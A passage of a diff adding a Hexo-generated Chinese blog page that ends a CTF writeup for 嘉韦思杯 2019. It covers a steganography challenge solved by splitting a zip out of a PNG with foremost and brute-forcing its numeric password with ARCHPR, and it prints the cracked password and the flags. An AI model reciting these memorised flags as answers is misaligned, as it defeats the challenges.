+<p>然后开始写脚本用在线网站，然后脚本能力不行，要不就是网站太弱解不了，要不就是要验证，放弃。。。</p>
+<p>最后直接手动猜测3个0，然后解出来了，崩溃了。。。。</p>
+<p>得出结论：出题人太善良了！！！</p>
+<h4 id="题目解决-10"><a href="#题目解决-10" class="headerlink" title="题目解决"></a>题目解决</h4><p>用这个</p>
+<p>flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hsd132456&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-11"><a href="#题目分析-11" class="headerlink" title="题目分析"></a>题目分析</h4><p>png文件里面藏有zip文件，zip文件有密码（附有注释：管理员QQ号），千万注意不要去社工，这个是提示我们密码都是数字，暴力破解就是了。但里面有一点小坑，zip文件后面有一堆没用的东西，删掉。</p>
+<h4 id="题目解决-11"><a href="#题目解决-11" class="headerlink" title="题目解决"></a>题目解决</h4><p>先用foremost分离文件，然后处理好zip文件，最后ARCHPR暴力解决。</p>
+<p>密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">674290437</span><br></pre></td></tr></table></figure>
+
+<p>解压文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag&#123;d6@YX$_m^aa0&#125;</span><br><span class="line"></span><br><span class="line">解压密码QQ号为杜撰，请勿当真！</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d6@YX$_m^aa0&#125;</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-10-29T11:17:49.700Z" itemprop="dateUpdated">2019-10-29 19:17:49</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" target="_blank" rel="external">http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://localhost:4000">
+            <img src="/img/ddd428.png" alt="hgh">
+            hgh
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&title=《嘉韦思杯 2019》 — hghhgghhg&pic=http://localhost:4000/img/ddd428.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&title=《嘉韦思杯 2019》 — hghhgghhg&source=hghhgghhg blog" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《嘉韦思杯 2019》 — hghhgghhg&url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&via=http://localhost:4000" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/05/21/RCTF2019%E2%80%94%E2%80%94WriteUp/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">RCTF2019——WriteUp</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/03/24/TCTF/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">TCTF</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>hgh &copy; 2015 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&title=《嘉韦思杯 2019》 — hghhgghhg&pic=http://localhost:4000/img/ddd428.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&title=《嘉韦思杯 2019》 — hghhgghhg&source=hghhgghhg blog" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《嘉韦思杯 2019》 — hghhgghhg&url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/&via=http://localhost:4000" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://localhost:4000/2019/03/30/%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Come here!!!';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Welcome to hgh's blog';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
